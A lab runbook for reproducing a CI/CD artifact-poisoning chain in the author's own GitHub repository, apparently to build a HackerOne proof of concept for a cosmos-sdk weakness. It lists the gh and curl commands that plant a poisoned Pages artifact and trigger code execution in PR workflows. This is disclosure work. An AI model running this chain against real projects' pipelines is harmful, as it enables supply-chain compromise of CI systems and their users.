# Lab Runbook: Artifact Poisoning → Pages → RCE

This lab reproduces the cosmos-sdk vulnerability pattern in your own repo so you can
prove the exploit works without touching cosmos-sdk.

## One-time Setup

```bash
# 1. Create the lab repo
gh repo create cicd-artifact-poisoning-lab --public --clone
cd cicd-artifact-poisoning-lab

# 2. Copy all files from this lab/ folder into the repo

# 3. CRITICAL: edit scripts/build-and-run.sh and replace YOUR_USERNAME with your handle
sed -i.bak 's/YOUR_USERNAME/your-actual-username/' scripts/build-and-run.sh
rm scripts/build-and-run.sh.bak

# 4. Make scripts executable
chmod +x .github/nightlies/*.sh scripts/*.sh

# 5. Commit and push
git add .
git commit -m "Initial lab setup"
git push -u origin main

# 6. Enable GitHub Pages (Settings → Pages → Source: GitHub Actions)
gh repo edit --enable-pages
# Or via web UI: https://github.com/<you>/cicd-artifact-poisoning-lab/settings/pages
# Set source to "GitHub Actions"
```

## Phase 1: Establish baseline (legit nightly)

Trigger the legit nightly build to populate Pages with the real binary.

```bash
gh workflow run build-nightlies.yml
gh run watch  # wait for it to finish

# Verify Pages is serving the legit binary
curl https://<your-username>.github.io/cicd-artifact-poisoning-lab/nightlies/latest/myapp-linux-amd64.tar.gz -o /tmp/legit.tar.gz
tar -xzOf /tmp/legit.tar.gz | head
# Should show: #!/bin/bash followed by "[LEGIT BINARY] Running normally"
```

**Capture for evidence:** screenshot of the workflow run + the curl output showing legit binary.

## Phase 2: Verify the consumer works (legit RCE proof-of-life)

Open a benign PR to trigger systemtests.yml.

```bash
git checkout -b test-baseline
echo "test" > test-baseline.txt
git add test-baseline.txt
git commit -m "Test baseline"
git push -u origin test-baseline
gh pr create --title "Baseline test" --body "Just testing the pipeline"
gh pr checks  # wait
```

**Expected:** workflow logs show `[LEGIT BINARY] Running normally`.

**Capture:** screenshot showing the legit binary execution log.

## Phase 3: ATTACK — Upload the poisoned artifact

```bash
git checkout main
git checkout -b attacker
git push -u origin attacker

# Trigger the attacker workflow
gh workflow run attacker-poison.yml --ref attacker
gh run watch
```

**Capture:** workflow logs showing the artifact was uploaded with name `github-pages`.

Verify it's there:
```bash
gh api "repos/:owner/:repo/actions/artifacts?name=github-pages" \
  --jq '.artifacts[] | {id, created_at, workflow_run_id: .workflow_run.id}'
```

You should see at least 2 artifacts: the legit one (from Phase 1) and the poisoned one.
The poisoned one has the newer `created_at`.

## Phase 4: Trigger the publish pipeline (poison the Pages)

Trigger the nightly again. This time, it'll pick up the attacker's artifact as "previous Pages content."

```bash
gh workflow run build-nightlies.yml --ref main
gh run watch
```

**Watch the publish job logs carefully**:
- "Download existing Pages content" step should download the attacker's artifact
- "Build site" step should show the poisoned binary in the site/ output
- The deploy-pages step should succeed without error

**Capture:** screenshot of the publish job showing it picked up the attacker's artifact ID.

Verify Pages now serves the poisoned binary:
```bash
curl https://<your-username>.github.io/cicd-artifact-poisoning-lab/nightlies/latest/myapp-linux-amd64.tar.gz -o /tmp/poisoned.tar.gz
tar -xzOf /tmp/poisoned.tar.gz | head
# Should show: 💀 POISONED BINARY EXECUTED 💀
```

**Capture:** the curl output showing the poisoned binary is now served.

## Phase 5: Trigger the RCE — open another PR

```bash
git checkout main
git checkout -b test-after-poison
echo "test" > test-after-poison.txt
git add test-after-poison.txt
git commit -m "Test after poison"
git push -u origin test-after-poison
gh pr create --title "Test after poison" --body "Demonstrating RCE"
gh pr checks
```

**Expected:** systemtests.yml workflow logs now show:
```
💀 POISONED BINARY EXECUTED 💀
Attacker code is now running in CI.
```

**Capture:** screenshot of the systemtests workflow logs showing the poisoned binary executed.

## What you now have for HackerOne

1. **Phase 2 screenshot** — proof the legit pipeline works
2. **Phase 3 screenshot** — proof the artifact poison was accepted
3. **Phase 4 screenshot** — proof the publish picked up the poisoned artifact
4. **Phase 4 curl output** — proof Pages now serves attacker content
5. **Phase 5 screenshot** — proof RCE in downstream consumer

That's a complete, verified, end-to-end PoC — without touching cosmos-sdk.

## Cleanup

```bash
gh repo delete cicd-artifact-poisoning-lab --yes
```

## Important Notes

- This lab assumes single-repo testing (no fork). The fork-PR variant is *documented*
  GitHub behavior; you don't need to re-prove it. Reference the Legit Security Rust
  finding in your report.
- Pages requires public repos on the free tier. If you want private, you need GitHub
  Team or Enterprise.
- The whole lab uses ~5 minutes of Actions time. Free tier gives 2000 minutes/month
  for public repos (effectively unlimited).
